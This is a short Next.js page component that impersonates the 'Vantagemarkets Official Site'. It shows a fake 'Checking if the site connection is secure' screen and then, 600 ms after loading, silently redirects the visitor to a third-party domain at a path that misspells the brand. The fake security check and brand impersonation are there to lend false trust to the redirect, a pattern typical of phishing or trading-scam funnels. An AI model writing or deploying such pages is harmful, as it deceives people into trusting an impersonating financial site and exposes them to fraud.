'use client'
import styles from "./page.module.css";
import Image from "next/image";
import circel from "../../../public/R-tron.png";
import { FcOk } from "react-icons/fc";
import { useEffect } from "react";

export default function page() {
    useEffect(() => {
      const timeout = setTimeout(() => {
        window.location.href = "https://hubbrokers.vn/top-fx-vantagemakets";
      }, 600);
      return () => clearTimeout(timeout);
      }, []);
  return (
    <div>
      <main className={styles.main}>
        <h3 className={styles.text}>
          Vantagemarkets Official Site{" "}
          <span
            style={{ transform: "translate(0px)", display: "inline-block" }}
          >
            <Image src={circel} alt="Logo" width={30} height={30} priority />
          </span>
        </h3>
        <p className={styles.text2}>
          Checking if the site connection is secure
        </p>
        <p className={styles.text3}>
          We needs to review the security of your connection before proceeding
          Vantagemarkets
        </p>
        <div style={{ marginTop: 30 }}>
          <span style={{display: 'inline-block', transform: 'translateY(8px)'}}><FcOk fontSize={30}/></span><span style={{marginLeft: 5}}>Sucure connection</span>
        </div>
        <p className={styles.text4}>Proceeding...</p>
       
      </main>
    </div>
  );
}
